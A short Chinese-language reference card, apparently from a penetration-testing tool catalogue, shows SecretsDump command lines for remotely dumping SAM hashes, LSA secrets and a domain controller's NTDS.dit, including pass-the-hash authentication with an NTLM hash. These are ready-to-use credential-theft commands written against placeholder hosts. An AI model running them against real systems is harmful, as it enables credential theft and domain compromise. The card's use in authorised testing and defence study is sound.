### SecretsDump

| 属性 | 值 |
|------|-----|
| 版本 | 0.9.24 |
| 平台 | Linux |
| 风险 | 🔴 高 |
| 标签 | `凭据导出` `SAM` `NTDS` |

## SecretsDump 远程提取凭据

### 提取目标主机的本地 SAM Hash
```bash
bash secretsdump.sh administrator:Admin@123@192.168.1.20
```

### 提取域控制器的 NTDS.dit (需 DCSync 权限)
```bash
bash secretsdump.sh contoso.com/administrator:Admin@123@192.168.1.10 -just-dc
```

### 使用 NTLM Hash 认证
```bash
bash secretsdump.sh administrator@192.168.1.20 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
```

- ✓ 远程提取 SAM、LSA 密钥和 NTDS
- ✓ 支持基于 DRSUAPI 或 VSS 的提取方式
- 无需在目标上执行任何代理
